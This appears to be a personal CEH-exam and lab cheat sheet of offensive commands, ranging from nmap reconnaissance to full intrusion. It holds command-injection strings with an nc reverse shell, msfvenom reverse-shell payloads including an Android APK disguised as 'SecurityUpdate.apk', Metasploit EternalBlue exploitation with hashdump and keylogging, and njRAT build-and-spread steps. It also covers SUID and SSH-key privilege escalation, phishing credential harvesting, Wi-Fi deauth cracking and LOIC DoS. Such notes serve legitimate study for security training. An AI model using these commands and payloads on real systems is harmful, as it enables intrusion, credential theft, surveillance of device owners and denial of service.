# Quick Start
```
https://anotepad.com/notes/yxsin32n
>netdiscover -r {any target}/24
>nmap -sn {any target}/24
>nmap -Pn -sS -A -oA nmap.xml 10.10.1.1/24 -vv && xsltproc nmap.xml -o nmap.html
>ping {IP}
>dnsenum zonetransfer.me
>nmap -sC -sV -A {IP}
>nmap --script vuln {IP}
>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc all -c -fc 404 -e .php,.html,.txt -u http://10.10.100.162/FUZZ
```

# Google Doorking/Search Engines

- `Site:eccouncilorg.org -www` gives all subdomains.

- `Inurl:page.php?id= site:*.pk` gives all SQL injection websites with `.pk` in domain.

# Directory Busting and VHost Enumeration

```console
>sudo apt install seclist

>gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
>ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

>gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.css,.js,.conf

>gobuster vhost ‐u http://example.com ‐w  /usr/share/wordlists/SecLists/Discovery/DNS/subdomains‐top1million‐5000.txt ‐‐ append‐domain
```

TakeOver Room
1. Connect to vpn
2.  Add to hosts file
3.  install seclists
4.   ping host
5.  `sudo nmap -T5 -sS -sV -O {ip_add}`
6.  Visit website
7.  `gobuster vhost -u {url} -w {wordlist} -k -t 100`
8.  Add found subdomains to host
9.  Go to site in browser
10.  Can view certificates for secret subdomain
11.  Browse secret subdomain in http and https

# DNS Enumeration
- `>dig ns zonetransfer.me (name server)`
- `>dig mx zonetransfer.me (mail server)`
- `>dig cname zonetransfer.me (cname server)`
- `>host zonetransfer.me`
- `>host -t ns zonetransfer.me`
- `>host -t mx zonetransfer.me`
- `>host {IP}`
- `>nslookup zonetransfer.me`
- `>host -t ns zonetransfer.me`

Try all listed name servers for best results
- `>host –l zonetransfer.me nsztm2.digi.ninja`
- `>dig ns zonetransfer.me`
- `>dig axfr zonetransfer.me @nsztm2.digi.ninja`

Automated Tools
```
>dnsrecon –d zonetransfer.me –t axfr
>dnsenum zonetransfer.me
>dnsmap zonetransfer.me -w /usr/share/seclists/discovery/DNS/fierce-hostlists.txt
>nmap -p 53 --script dns-brute zonetransfer.me
>dnsmap zonetransfer.me -w /usr/share/seclists/discovery/DNS/fierce-hostlists.txt
```

# Host Discovery
```
>sudo netdiscover -i (network interface name, from ifconfig)
>nmap –sn 192.168.18.1/24
>nmap -sn -PR 192.168.18.0-255
>nmap -sn -PU 192.168.18.110 //UDP ping scan
>nmap -sn -PE 192.168.18.1-255 //ICMP Echo Ping scan 
>nmap -sn -PM 192.168.18.1-255 //Mask Ping scan (use if ICMP is blocked) 
>nmap -sn -PP 192.168.18.1-255 //ICMP timestamp scan 
>nmap -sn -PS 192.168.18.1-255 //tcp syn ping scan 
>nmap -sn -PO 192.168.18.1-255 //IP protocol scan.use different protocols to test the connectivity
Or use AngryIP (ensure preferences is set to UDP+TCP, and display only live hosts)
```

# Service and OS Discovery
`>sudo nmap –sS –sV -O 192.168.18.1/24 (or specific IP)`
Nmap also has an inbuilt script to identify the OS but it needs smb service running on the system 
`>sudo nmap --script smb-os-discovery.nse 192.168.18.110`
We can use the following one-liner on most of the targets to gather a lot of useful information like OS detection, version detection, script scanning, and traceroute
`>sudo nmap –sS –p 445 –A 192.168.18.1`

# NetBIOS Enumeration
NetBIOS Ports
UDP port 137: This port is used for the NetBIOS Name Service (NBNS) or the NetBIOS Name Resolution service. It handles the registration and resolution of NetBIOS names. 
UDP port 138: This port is used for the NetBIOS Datagram service. It supports the transmission of datagram messages between NetBIOSenabled devices. 
NetBIOS over TCP/IP (NBT) can also use TCP port 139 for session establishment and data transfer.

Use the following command on windows to enumerate NetBIOS names for a target 
`>nbtstat -a 192.168.18.110`
Or NMAP
`>nmap -sV -v --script nbstat.nse 192.168.18.110`
`>nmap -sU -p 137 --script nbstat.nse 192.168.18.110`

# WPSCAN - Word Press Enum
```
>wpscan --url {URL} --enumerate u,p,t,vp --api-token {token}
>wpscan --url {URL} --passwords {path to wordlist} --usernames {usernames}
```
Or Metasploit
```
>service postresql start
>msconsole
>use auxillary/scanner/wordpress_login_enum
>set PASS_FILE {path to wordlist}
>set RHOSTS {target IP}
>set RPOST 8080
>set TARGETURI {url}
>set USENAME adminrun
```

# SMB Enumeration
TCP port 445: This is the primary port used by SMB for file sharing and
communication. It handles the majority of SMB traffic, including file access,
printer sharing, and remote administration

UDP ports 137 and 138: These ports are used by SMB for NetBIOS name
resolution and datagram services, similar to NetBIOS

TCP port 139: This port is used by older versions of SMB for session
establishment and file sharing. It is commonly used in conjunction with
NetBIOS over TCP/IP (NBT)
```
>sudo nmap -A –p 445 192.168.18.110
>sudo nmap --script smb-os-discovery.nse 192.168.18.110
>sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.18.110
This guy -> >enum4linux -a 192.168.18.110
```

# Metasploit and Windows 10 Hacking
1. `>nmap –A –sC 192.168.1.2`
    A flag is used to gather most important information  about the target including OS, versions etc  
    sC flag runs Nmap default scripts against the target
2. `>sudo msfconsole (can search for eternal blue >search eternal)`
3. `>use exploit/windows/smb/ms17_010_psexec (check >options)`
4. `>set RHOSTS 192.168.1.2 (target)`
5. `>set LHOST 192.168.1.4 (my IP)`
6. `>exploit`
The Meterpreter shell is essentially an attack platform that gets injected into the memory of the running process. Thus it avoids detection by HIDS as well as bypassing the limitations of the operating system’s native command shell
The Meterpreter can be used to perform different actions on the machine which includes  
  Taking Screenshot  
  Get a live screen of the target  
  View webcam  
  Record keystrokes  
  Get a shell etc
7. `>migrate 4564 (from >ps, look for cmd.exe)`
8. `>screenshot`

# Port Scanning
1. **Open**: The port is actively accepting TCP connections or UDP datagrams. An open port indicates a service is running on the target machine, listening for connections or data.
2. **Closed**: The port is accessible but there is no application listening on it. Closed ports respond to Nmap's attempts but indicate there is no service to connect to. Closed ports can still be of interest as they show that a host is up and responding, and they could potentially be opened to start a service.
3. **Filtered**: Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be due to a firewall, router rules, or other network security measures that drop packets to or from the port.
4. **Unfiltered**: The port is accessible, but Nmap cannot determine if it is open or closed. This state is used for some scan types where open and closed states cannot be differentiated.
5. **Open|Filtered**: This state is used when Nmap cannot determine if a port is open or filtered. This can happen for scan types that are unable to distinguish between a port being open or being filtered by a firewall.
6. **Closed|Filtered**: This is a state specifically used for IPv6 scanning with Nmap. It indicates that Nmap cannot determine whether a port is closed or filtered.
`>sudo nmap -T5 -sS -A -sC {target_ip}`

# Vulnerability Assessment
`>searchsploit vsftpd 2.3.4 (from nmap –A –sC 192.168.1.2 things running on ports)`
OR Nessus GUI Do a scan

# Exploitation (following assessment)
```
>sudo msfconsole
>search vsftp
>use exploit/unix/ftp/vsftpd_234_backdoor
>show options
>set RHOSTS 192.168.1.2 (target)
>exploit
This should give shell
>whoami, ps, cd etc
```

# Post Exploitation (Win 10)
```
>sudo msfconsole
>search eternalblue
>use exploit/windows/smb/ms17_010_psexec
>set RHOST 192.168.1.2 (target IP)
>set LHOST {local ip}
>exploit
>ps (processes)
>help (shows options to post exploit)
>ps - get id of explorer.exe (or something running as system)
>migrate XXXX 
>screenshot
>getui
>screenshare
>hashdump 
>getsystem
>run <script>
>keyscan_start/keyscan_dump
>run winenum (for system information)
```

# FTP Exploitation
Use nmap to check port 21
`>ftp {target ip}`
Anonymous login may be possible (name anonymous, no password)
We can use Hydra to brute force the password of an FTP user
`>locate rockyou`
`>hydra ‐l {username} ‐P /usr/share/wordlists/rockyou.txt –v 10.10.223.20 ftp`
FTP Commands (ls, get)

# SMB Exploitation
Default ports 139 & 445
`>​​nmap ‐sS ‐T4 10.10.50.26`
`>enum4linux ‐a 10.10.50.26`
Or
`>sudo nmap ‐‐script smb‐os‐discovery.nse 10.10.50.26`
`>smbclient ‐L (to list all shares)`
`>smbclient //10.10.50.26/share  (access it)`
`>cat “Filename” or >more “Filename” or >get “filename”`
To get an rsa key to work chmod 600 id_rsa
`>ssh -i id_rsa cactus@{targetIP}`

# Telnet Exploitation
```
>nmap –sS –T4 ‐p‐ 10.10.50.26   (normally port 23)
>telnet $IP $PORT
>.HELP (to view commands

--Attacker machine--
>sudo tcpdump ip proto //icmp -i tun0

--Telnet prompt--
.RUN ping {attacker IP} -c 1

-—New attack—-
>msfvenom -l payloads | grep netcat
>msfvenom -p cmd/unix/reverse_netcat LHOST=10.8.64.134 LPORT=444
Copy generated payload string
>nc -lnvp 444 (to listen for the reverse shell)
—-
On target machine through telnet prompt
>.RUN {generated payload}
—-
Back on reverse shell listener
>ls
>cat “filename”
>whoami
```

# Escalate Privileges by Exploiting Vulnerability in pkexec (CEH Lab)

We will be exploiting the pkexec CVE-2021-4034 vulnerability
LinPeas (github) to check for privilege escalation
From linpeas out put pick pwnkit and search google for pwnkit on github (also available in iLabs)
```
>cd /tmp
>git clone {github url}
>cd into folder
>make
>./{file}
>whoami
```

# Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS (CEH Lab)
On target machine
```
>sudo apt-get update
>sudo apt install nfs-kernel-server
>nano /etc/exports
Edit the export file to make home directory as share
/home *(rw,no_root_squash)
>sudo /etc/init.d/nfs-kernel-server restart
On Attacker 
>sudo nmap -sV --script=nfs-showmount {targetIP} (should see port 2049 open)
>sudo apt-get install nfs-common
>showmount -e {target IP}
>mkdir /tmp/nfs
>mount -t nfs 192.168.1.102:/home /tmp/nfs
>cp /bin/bash .
>chmod +s bash
>ls -la bash
>sudo df -h
>ssh -l ubuntu {target IP}
>cd /home 
>ls 
>./bash -p 
>id 
>whoami
>cp /bin/nano . 
>chmod 4777 nano 
>ls -la nano
>./nano -p /etc/shadow
```

# Escalate Privileges via SSH
```
>ssh {user}@{targetIP}
Password from shoulder surfing, previous challenege, or hydra
>whoami
>sudo -l (look for NOPASSWD)
>sudo -u {user2} {command} (e.g. >sudo -u user2 /bin/bash)
>whoami
>cat flag file

Vertical (maybe after horizontal):
>cd /root
>ls -la
>cd .ssh
>ls
>cat id_rsa
Copy private key
Paste to local machine id_rsa
>chmod 600 id_rsa
>ssh root@{targetIP} -i id_rsa
If permission denied, try to specify port
>ssh root@{targetIP} -p {port} -i id_rsa
>whoami

OR
>ssh {user}@{targetIP}
>sudo -u user2 /bin/bash
>cd /root
>cd .ssh
>cat authorised_keys
On local >ssh-keygen -f key
Copy public key to authorised keys
(Through ssh session) >echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
(on local) >ssh root@10.10.10.10 -i key

```
Ref https://academy.hackthebox.com/module/77/section/844

# Escalate Privileges (advanced)
```
>ssh {user}@{targetIP}
>ls
>stat -c "%a %A %U %G %F" {filename}

```

# Covert Communication
```
Download and compile  on both systems:
>wget https://raw.githubusercontent.com/cudeso/security‐ tools/master/networktools/covert/covert_tcp.c
>sudo apt install gcc 
>cc ‐o covert_tcp covert_tcp.c
Start the listener on Parrot OS
>sudo ./covert_tcp ‐dest 192.168.18.144 ‐source 192.168.18.95 ‐source_port 8888 ‐ dest_port 9999 ‐server ‐file /home/user/msg1.txt
192.168.18.144 is the IP of Parrot OS
192.168.18.95 is the IP of Sender (Kali)
8888 is local listening port
9999 is the remote port of kali
‐server puts covert_tcp in listener mode and msg1.txt is the destination file where message will be saved
Send the message from Kali machine
>sudo ./covert_tcp ‐dest 192.168.18.144 ‐source 192.168.18.95 ‐source_port 9999 ‐ dest_port 8888 ‐file /home/kali/msg.txt
192.168.18.144 is the IP of Parrot OS
192.168.18.95 is the IP of Sender (Kali)
8888 is destination listening port on parrot
9999 is the local port of kali
```

# Hide Files using Alternate Data Streams (on windows)
```
Copy calc from system32 folder to your test folder, Now create a text file and append the cal.exe to the file 
>type calc.exe >readme.txt:calc.exe
Now create a link to the ADS file to create backdoor 
>mklink backdoor.exe readme.txt:calc.exe
Whitespace Steganography
Download from darkside.com.au/snow/
>SNOW.EXE -C -m "Hassan is my name" -p "magic" test.txt test2.txt  
-m is the message you want to hide  
-p is the password  
test.txt is the original file  
test2.txt is the target file
To reveal the message:
>SNOW.EXE -C -p "magic" test2.txt
```

# Image Steganography
Open Stego (download)
https://georgeom.net/StegOnline/upload (online)

# Command Injection - Linux
If a website allow you to execute a command then possibly able to command inject
View the source to check for sanitisation

For example if an application allows you to ping an address:
```
Easy/Medium (only some will work)
>127.0.0.1 && ls 
>127.0.0.1 & ls 
>127.0.0.1 ; ls 
>127.0.0.1 | ls 
>127.0.0.1 && nc ‐c sh 127.0.0.1 9001 (after starting listener using >nc -lnvp 9001)

Hard (use typos)
>127.0.0.1 |ls
```

# Command Injection - Windows
As above but with different commands
```
>127.0.0.1 && dir 
>127.0.0.1 & dir 
>127.0.0.1 ; dir 
>127.0.0.1 | dir 
```

```
>|Hostname
>|Whoami
>|tasklist
>|taskkill /PID 3112 /F   //forcefully kills the processes
>|dir c:\
>|net user
>|net user test /add     //add a new user
>|net localgroup Administrators test /add    //add test user to administrators
>|net user test     //to view the details of the user
>|dir c:\ "pin.txt" or this command >! Take pin.txt   //to get content
>|type c:\"pin.txt“   //to get the content of a file
```

# File Upload
If a website allows file upload then create a file to upload
```
>msfvenom ‐p php/meterpreter/reverse_tcp LHOST={myIP}  LPORT=4444 ‐f raw >exploit.php
>use exploit/multi/handler 
>set payload  >php/meterpreter/reverse_tcp (to listen for reverse shell
Upload to server
Access on server (through web browser)
Then can execute commands, and rm to remove

If harder then use burp to try to upload, capture, then set content type to image/jpeg (or whatever)
```

```
Start metasploit
>search handler (looking for multi/handler)
>use {id or name}
>use exploit/multi/handler 
>set payload  >php/meterpreter/reverse_tcp (to listen for reverse shell
>options
>set LHOST {local}
>run
>msfvenom -l payloads | grep php
>msfvenom ‐p php/meterpreter/reverse_tcp LHOST={myIP}  LPORT=4444 ‐f raw >exploit.php
Upload to server
Access on server (through web browser)
Then can execute commands, and rm to remove
```

#Brute forcing on DVWA with Burp and Hydra
```
Set firefox to use burp proxy
Submit request and capture in burp, then send to intruder module
In intruder tab clear all targets and locate password field and add as target
Payloads tab, set wordlist (maybe john.lst)

>hydra -l admin -P /usr/share/wordlists/john.lst 'http-getform://127.0.0.1:42001/vulnerabilities/brute/:username=^USER ^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4 mhc1q4dnp3f6cgikl01v9q; security=low:F=Username and/or password incorrect'
```
```If CRSF protection in place
As above but targets are token and password field and attack type is “pitchfork”
Second payload Recursive grep
In options tab add new grep extract and select the token to extract (start at offset, end at fixed length)
In options tab in grep - match clear, and add ‘incorrect’
Ensure redirections are set to always
Create a new resource pool with only 1 thread
Start attack
```

# File Upload High Difficulty/Chaining multiple Vulnerabilities
```
Create a msfvenom payload on your kali machine 
>msfvenom ‐p php/meterpreter/reverse_tcp LHOST=127.0.0.1  LPORT=4444 ‐f raw >exploit.php
Now run Metasploit and start a multi‐handler to listen to PHP  reverse sessions. 
>use exploit/multi/handler set payload  >php/meterpreter/reverse_tcp
If the server checks for the file type as well. We  can bypass it by appending content type header in the file  itself. So, add GIF89a; on top of your exploit file using nano. Rename it to  exploit.php.jpeg and upload it.
Rename it using command injection
| mv "/usr/share/dvwa/hackable/uploads/exploit.php.jpeg"  "/usr/share/dvwa/hackable/uploads/exploit.php"
```

# SQL Injection - Easy
```
> 1‘ OR 1=1 #
To do complex commands, intercepts a normal request with burp and save to txt document.
>sqlmap -r request.txt –dbs
>sqlmap ‐r request.txt ‐D dvwa ‐‐tables
>sqlmap ‐r request.txt ‐D dvwa ‐T users ‐‐columns
>sqlmap ‐r request.txt ‐D dvwa ‐T users ‐‐dump‐all

For harder use 
UNION SELECT user, password FROM users #
And put it in the option value of a dropdown

For Hardest use 
1’ UNION SELECT user, password FROM users #
```

# Vulnerability Analysis
In Parrot 
Open OpenVas
127.0.0.1:9392/login
admin/password
Scans -> Task
Task Wizard - Enter target IP
When completed view the report

In Windows (Nessus)
https://localhost:8834
admin/password
Policies -> New policy
Advanced Scan
    Basic
        Set name
        Set desc
    Discovery
        Port scanning
            Tick Verify open TCP ports found by local port enumarators
    Advanced
        Max concurrent TCP both 'unlimited'
    Credentials Tab
        Windows
            Username and password (already have, or found?)
Save
Scans
    Create new scan
    User defined
    General Settings
        Name
        Desc
        Target: Target IP
    Save
    Launch from dropdown menu
Takes 15 minutes, then view report
Can generate report

In Parrot 
Open Nikto (web vulnerability scanner)
```
>nikto -h {website} -Tuning x
>nikto -h {website} -Cgidirs all
-o output -F txt
```

# Malware Analysis
Hybrid Analysis
In Windows navigate to hybrid-analysis.com
Upload file
Select environment
Run
Click on details tab for more details
Click on behaviour for behaviour information

BinText
Open BinText.exe
Select target file
Run

PEid (Obfuscation) for windows executable files
Open PEiD.exe
Select target file
Run

# ELF Analysis using Detect It Easy (DIE)
On windows Run the tool, select target file
Use side menus for different bits of information, info, hash, entropy, strings

# Find the Portable Executable (PE) Information of a Malware Executable File
For windows files
Install and Launch PE explorer
File-Open file
Can view info, entry point, checksum, virtual address, tables, section headers, .text, .rdata, .data, .rsrc


# Identify File Dependencies using Dependency Walker
Start Dependency Walker
File-Open target file

# Perform Malware Disassembly using IDA
Start IDA (may need to search)
Open target file
Various tabs

# Perform Malware Disassembly using OllyDbg
Open OllyDbg
File open
Select View -> Log, executable modules, memory, threads (or others)

# Perform Malware Disassembly using Ghidra
Start it
New project
File import {target file}
Double click to analyse

# Gain Control over a Victim Machine using the njRAT RAT Trojan
On windows get (from E drive maybe) njRat and start on default listening port (default port is 1177, may also use ports 8008 and 8521, 5552)
Click builder, provide attacker IP
Ensure registry startup is selected
Click build
Save to desktop
Share via shared folder, email, whatsapp, file upload + command injection
On attacker computer should be listed in njRat window on attacker
Right click on machine name and click (file) Manager, Remote desktop, services (can kill), remote shell etc

# Create a Trojan Server using Theef RAT Trojan
Run Theef SERVER on VICTIM machine (maybe from shared drive)
Run Theef CLIENT on ATTACKER, provide target IP and port (default 6703, ftp 2968)
Can get information, keys icon, browser etc

# Detect DDOS attack with Wireshark
```
In wireshark filter by tcp.flags.syn == 1 and tcp.flags.ack == 0
Then filter by filter by tcp.flags.syn == 1 and tcp.flags.ack == 1
I/O graph can be found in Statistics> I/O Graph menu
Statistics -> Conversations -> ipv4
```

# Credentials extraction from Wireshark
```
Open pcap http traffic
Filter by http.request.method==POST
Or filter ftp
```

# Detect IoT traffic
```
In wireshark
Open pcacp
Filter on mqtt
Analyse publish message in bottom left pane MQ telemetry
```

# Hacking Android Devices with msfvenom
```
Generate a malicious apk and open a multi/handler listener 
>msfvenom –p android/meterpreter/reverse_tcp LHOST=Localhost IP  LPORT=LocalPort R > android_shell.apk
>python3 http.server
Download and install to victim machine using social engineering
New tab
>msfconsole
>use exploit/multi/handler/
>set payload android/mmeterpreter/reverse_tcp
>options
>set LHOST {local IP}
>run
On Android machine navigate to attacker ip address:8000
Download malicious apk, install and open
```

# Hacking Android Devices with Phonesploit over ADB
```
Download and install the framework with following commands
>apt install adb
>git clone https://github.com/aerosol‐can/PhoneSploit
>cd PhoneSploit
>pip3 install colorama
Now fire up the framework  
>python3 phonesploit.py
Type in IP address of victim machine

On android, ensure USB debugging is on, and get IP address from WIfi Settings
On attacker
>sudo nmap -sS -p- -Pn {target IP}
```

# Hack an Android Device by Creating Binary Payloads using Parrot Security
```
>msfvenom -l payloads | grep android
>msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 LPORT=4444 –f raw –o Backdoor.apk
>cp backdoor.apky Downloads/backdoor.apk
>Cd Downloads
>python3 -m http.server 8000
New tab
>msfconsole
>use exploit/multi/handler
>set payload android/meterpreter/reverse_tcp
>set LHOST {attacker IP}
>options
>exploit
On target device go to {attackerIP}:8000 download install and run
On attacker, meterpreter should start
>sysinfo, ipconfig, pwd, ps
>cd /sdcard
>ls -la (show hidden files too) (flag files here)
>cd DCIM (photos
>cd .thumbnails
>ls -la (show hidden files too)
```

# Phishing Attacks on Android Devices with Social Engineering toolkit
```
>cd social-engineering-toolkit
>sudo ./setoolkit
>1 (Social engineering attacks)
Select 2 for web attack
Then select 3 for credential harvesting
Select 1 for web template
Select 2 for google
Send link to victim to harvest credentials
```

# Conducting DOS attack from Android using LOIC
```
In andoird install LOIC
Left side, target IP
Protocol TCP
Click get IP
Set port to 80 and threads to 100
Click start
On target machine
Start wireshak
Statistics -> Conversations -> ipv4
```

# Exploit the Android Platform through ADB using PhoneSploit
```
On attacker
>cd PhoneSPloit
>python3 phonesploit.py
>{targetIP}
>cd sdcard/Download (interesting files placed here)
>exit
Option 7 to take screenshot
List Apps, System info. Force start apps
Option 15 to force start an application
Option 9 to download files from android to local
```

# Hack an Android Device by Creating APK File using AndroRAT
```
In this task, we will use AndroRAT to create an APK file to hack
an Android device.
Open terminal
>sudo su
>cd AndroRAT
>python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
--build: is used for building the APK
-i: specifies the local IP address (here, 10.10.1.13)
-p: specifies the port number (here, 4444)
-o: specifies the output APK file (here, SecurityUpdate.apk)
New tab
>cd AndroRAT
>python3 -m http.server 8888
New tab
>cd AndroRAT
>python3 androRAT.py –shell -i 0.0.0.0 -p 4444 (to listen for connections
In android
Browse to attacker IP and port
Download and install SecurityUpdate.apk
In attacker, session started and can type help to see options
>help
>deviceInfo
>getSMS inbox
>getMACAddress
```

# Analyse a Malicious App using Online Android Analyzers
```
Go to Android machine
Go to sixo online apk analyser in Browser
Upload APK
```

# Wifi Hacking
```
AP – Access Point (The wifi router)
MAC – Media Access Control
BSSID – Access Point's MAC Address  
ESSID ‐ Access Point’s Broadcast name. (ie linksys, default,  belkin etc)
Channel - The frequency of the transmission
```

# Crack Wifi with Aircrack
```
1. Capture the Handshake
    Put wifi card into monitor mode
        >iwconfig
        >airmon-ng start wlan0
    Capture traffic
        >airodump-ng {wifi card name e.g. wan0mon}
    Now start capturing the related traffic of your  target AP
        > airodump‐ng ‐c 6 ‐‐bssid C0:F6:C2:5E:8D:20 ‐w pass wlan0mon
        ‐c 6 is the channel for the wireless network  
        ‐‐bssid C0:F6:C2:5E:8D:20 is the access point MAC address.  This eliminates extraneous traffic.  
        ‐w pass is the file name   
        ‐wlan0mon is the interface name 
    Deauthenticate the Wireless clients 
        >  aireplay‐ng ‐0 100 ‐a C0:F6:C2:5E:8D:20 wlan0mon
        ‐‐0 means deauthentication  100 is the number of deauth packets to send  
        ‐a C0:F6:C2:5E:8D:20 is the access point MAC address  
        ‐wlan0mon is the interface name.
    Look for the WPA Handshake in the Notification 
        >  Press CTRL + C , Once you have handshake
2. Crack the password
    Now you can use the following command to break the  password with Dictionary attack 
        >  aircrack‐ng ‐w /usr/share/wordlists/rockyou.txt ‐b C0:F6:C2:5E:8D:20 pass*.cap 
        If rockyou is compressed
            >locate rockyou
            Gunzip {file path}
            Ls to check
        >  aircrack‐ng pass*.cap ‐w /usr/share/wordlists/rockyou.txt
Best Alternate Word lists Collections.  
https://weakpass.com/  https://github.com/danielmiessler/SecLists/tree/master/Pass words/WiFi-WPA  
https://labs.nettitude.com/blog/rocktastic/  
https://github.com/kennyn510/wpa2-wordlists
```

# Perform Wireless attacks with saved PCAP
```
Copy wordlist into sample captures folder
Open terminal in sample caputes folder
>aircrack-ng {pcap file} (gives key)
>aircrack-ng {pcap file} -w {wordlist file}
```

# S3 Bucket Enumeration
```
Download LazyS3 from github
>ruby lazys3.rb <COMPANY>
Got to {result}.s3.amazonaws.com

>Sudo apt install cloud-enum
>cloud_enum -k flaws.cloud --disable-azure --disable-gcp

Browser extension:
https://github.com/AlecBlance/S3BucketList
```

# S3 Bucket Exploitation
```
>Sudo apt install update  
>Sudo ap-get install awscli
>aws s3 ls s3://flaw.cloud/ --no-sign-request
>aws s3 cp s3://flaws.cloud/secret-dd02c7c.html . --no-sign-request
>aws s3 cp ./index.html s3://flaws.cloud --no-sign-request
S3 Bucket Exploitation (Authentication)
Create AWS Profile
>aws s3 --profile ammar ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```

# Disk Encryption Using Veracrypt
```
Download and install
Select created an encrypted file container
Mount the disk to encrypt it
```

# File and Text Message Encryption using Cryptoforge
```
Download and install
Right click file and select encrypt
Right click to decrypt too (Have to set passphrase within Cryptoforge)
Can En/Decrypt text too with Cryptoforge Text
```

# Calculating Hashes on Windows with different tools
```
Hashcalc
MD5 Calculator
Hash my files
```

# Cryptanalysis using Cryptool
```
Download and install
```

# Pickle Rickle
```
Add to /etc/hosts (if required)
View Page source
Check /robots.txt
>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.100.162/FUZZ -mc all -c -fc 404 -e .php,.html,.txt 
Optional to exclude file size responses (false positives -fs 1062)
If you have command prompt can do reverse shell https://www.revshells.com/
Locations of interest - home, root
Passwords located: https://www.cyberciti.biz/faq/where-are-the-passwords-of-the-users-located-in-linux/
```

# Brute It
```
>sudo nmap -sS -sC -sV -O -p- -A -T5 10.10.200.80
>nmap -sS -sV 10.10.200.80
>ffuf -u http://10.10.200.80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Go to /admin
View Page Source
>hydra -l admin -P /usr/share/wordlists/john.lst 10.10.200.80 http-form-post "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid” -V -I -t 4 
Download key
>ssh2john file.txt > hash.txt
>john hash.txt -w=/usr/share/wordlists/john.llst
>john hash.txt -w=/usr/share/wordlists/rockyou.txt
>mv file.txt id_rsa.pem
>chmod 600 id_rsa.pem
>ssh -i id_rsa.pem john@{IP}
>password from crack before
>sudo -l
Check https://gtfobins.github.io/ to see how to escalate inlux
>cat /etc/passwd
Copy contents to new file
>cat /etc/shadow
Copy contents to new file
>unshadow passwd.txt shadow.txt >hashes.txt
>john hashes.txt -w=/usr/share/wordlists/rockyou.txt
Get password
>su root
>cd /root
>ls
```

# SQLMAP
```
Check for robots.txt
Fuzz the server for pages
>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.143.169/FUZZ -mc all -c -fc 404 -e .php,.html,.txt
>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -u http://10.10.10.10
>
Once found find a page with SQL query
Intercept request in Burp and copy to file (sqlmap-request.txt)
>sqlmap -r sqlmap-request.txt --dbs
>sqlmap -r sqlmap-request.txt --tables 
>sqlmap -r sqlmap-request.txt -D blood -T flag --dump
>sqlmap -r sqlmap-request.txt -D blood -T users --dump
>sqlmap -r sqlmap-request.txt --os-shell
>sqlmap -r sqlmap-request.txt --a
```

# Eternal Blue
```
>nmap -sS -sC -A -p- -Pn 10.10.126.131
>nmap -sT 10.10.126.131
>sudo nmap –script vuln {targetIP}
Start metasploit
>>search ms17-010 (from --script vuln)
>>use exploit/windows/smb/ms17_010_eternalblue
>>options
>>set RHOSTS {targetIP}
>>set LHOST (ifconfig IP)
>>set payload windows/x64/shell/reverse_tcp
>>exploit
CTRL+Z to background session
>>use post/multi/manage/shell_to_meterpreter
>>set LHOST 10.9.238.129
>>set SESSION 1 (from >sessions)
>>exploit 
>>sessions -i 1 (to switch back to the upgraded session)
>>>ps
migrate to a process running as  NT AUTHORITY\SYSTEM
>>>migrate XXX
>>>hashdump
>>>copy hash and paste to txt file, save.
>>>open terminal where saves
>>>locate rockyou (wordlist)
>>>john -w=”/usr/share/wordlists/rockyou.txt” hash –format=NT
>>>search -f flag*
>>>cat c:/flag1.txt (change slashes if doent work)
```

# Bog standard attack
```
HTB download vpn, open terminal at location, >sudo openvpn {file}
>ifconfig to get tunnel IP


>sudo nmap -sS -sC -sV -O {targetIP}
>sudo nmap –script vuln {targetIP}
>sudo msfconsole
>search {result from 2}
>use {name}
>options (view options required)
>set RHOSTS {target IP}
>set payload (if required)
>exploit
>whoami
>CTRL-Z (background the session)
>sessions (to see running sessions)
>search shell_to_meterpreter
>use {name from 13}
>options
>set SESSION {session from 12}
>set LHOST {my IP}
>exploit
>sessions (to see meterpreter session)
>ls, ps, help etc
>migrate XXX {services.exe from ps}
>hashdump
>copy hash and paste to txt file, save.
>open terminal where saves
>locate rockyou (wordlist)
>john -w=”/usr/share/wordlists/rockyou.txt” hash –format=NT
>search -f flag*
>cat c:/flag1.txt (change slashes if doent work)
```

## Example Scenario #1
There is a machine running wamp server in the subnet. Provide the IP address of the server.
- **Tips:** Scan the entire subnet with -A(aggressive scan) in nmap or use -sV(version flag). You can speed up the scan by specifying port with -p as 8080,80,443.
- **Things to google:** Scanning with nmap

## Example Scenario #2
Find the FQDN of the domain controller in the network.
- **Tips:** Scan the entire subnet with -A(aggressive scan) in nmap. The FQDN will appear for the server.
- **Things to google:** Scanning with nmap, smb-os-discovery script can reveal whether a machine is a domain controller

## Example Scenario #3
Identify the machine with smb enabled. Crack the smb credentials for the username given. Access an encrypted file and decode the encrypted file to retrieve the flag.
Check hydra-sheet
- **Tips:** Scan the entire subnet for open smb ports. You can use the wordlist available on the desktop on Parrot os. Use Hydra to crack it. You can also use Metasploit to crack the password. Use Msfconsole auxiliary/scanner/smb/smb_login. The password for the encoded file is the same. If the file contains a hash, try to decode it.
- **Things to google:** smb enumeration, FTP Exploitation.

## Example Scenario #4
There is an Android device in the subnet. Identify the device. Get the files in scan folder. Provide SHA384 hash with the largest of entropy.
- **Tips:** Scan the entire subnet to identify android device. Use Phonesploit, pull required folder to download files, check the entropy of all files (Detect it easy tool), and then calculate hash. (hashcalc)
- https://codebeautify.org/sha384-hash-generator
  OR
- https://hash.online-convert.com/sha384-generator
- https://products.aspose.app/pdf/hash-generator/sha384
